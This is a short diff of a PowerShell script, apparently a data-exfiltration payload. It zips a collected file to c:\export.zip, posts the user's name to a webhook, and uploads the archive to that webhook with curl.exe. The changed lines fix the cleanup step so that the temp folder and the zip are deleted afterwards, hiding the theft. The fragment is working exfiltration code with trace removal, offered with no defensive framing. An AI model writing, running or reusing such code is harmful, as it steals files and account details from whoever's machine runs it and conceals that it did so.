@@ -6,5 +6,5 @@ $filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % 
 Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
 $Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
-rm -r \temp
-rm -r \export.zip
+rm -r C:\temp
+rm -r C:\export.zip
